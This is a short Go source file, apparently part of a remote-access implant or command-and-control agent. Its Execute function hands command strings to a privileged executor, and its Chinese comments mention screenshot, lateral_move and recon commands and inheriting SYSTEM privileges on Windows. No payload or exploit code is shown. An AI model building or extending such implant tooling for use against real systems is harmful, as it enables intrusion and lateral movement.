package commands

// Execute 执行命令并返回结果
// 支持特殊命令：screenshot, lateral_move:*, recon:*
// Windows 平台会自动使用 ExecuteWithPrivilege 以继承 SYSTEM 权限
func Execute(cmdStr string) string {
	// Windows 平台使用特权执行
	return ExecuteWithPrivilege(cmdStr)
}
